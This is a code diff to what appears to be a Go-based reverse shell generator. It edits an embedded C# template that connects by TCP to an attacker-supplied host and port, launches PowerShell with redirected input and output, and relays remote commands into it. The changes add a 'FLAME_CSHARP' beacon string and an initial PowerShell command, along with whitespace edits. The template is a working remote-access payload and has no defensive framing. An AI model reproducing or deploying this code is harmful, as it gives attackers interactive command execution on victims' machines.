@@ -61,7 +61,6 @@ func (r *ReverseShellGenerator) GenerateCSharpSource() string {
 using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
-
 public class Program
 {
     private static StreamWriter streamWriter;
@@ -89,12 +88,14 @@ public class Program
         proc.StartInfo.RedirectStandardOutput = true;
         proc.StartInfo.RedirectStandardError = true;
         proc.StartInfo.RedirectStandardInput = true;
-        proc.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
-        proc.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);
-        proc.Start();
-        proc.BeginOutputReadLine();
-        proc.BeginErrorReadLine();
-        return proc;
+		proc.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
+		proc.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);
+		proc.Start();
+		proc.BeginOutputReadLine();
+		proc.BeginErrorReadLine();
+		proc.StandardInput.WriteLine("Get-Location | Out-Null");
+		proc.StandardInput.Flush();
+		return proc;
     }
 
     public static void Main(string[] args)
@@ -114,12 +115,13 @@ public class Program
             }
 
             using (var client = new TcpClient("%s", %d))
-            using (var stream = client.GetStream())
-            using (var reader = new StreamReader(stream))
-            {
-                streamWriter = new StreamWriter(stream);
-                streamWriter.AutoFlush = true;
-                Process proc = StartPowerShell();
+                    using (var stream = client.GetStream())
+                    using (var reader = new StreamReader(stream))
+                    {
+                        streamWriter = new StreamWriter(stream);
+                        streamWriter.AutoFlush = true;
+                        streamWriter.WriteLine("FLAME_CSHARP");
+                        Process proc = StartPowerShell();
 
                 string userInput = "";
                 while ((userInput = reader.ReadLine()) != null)
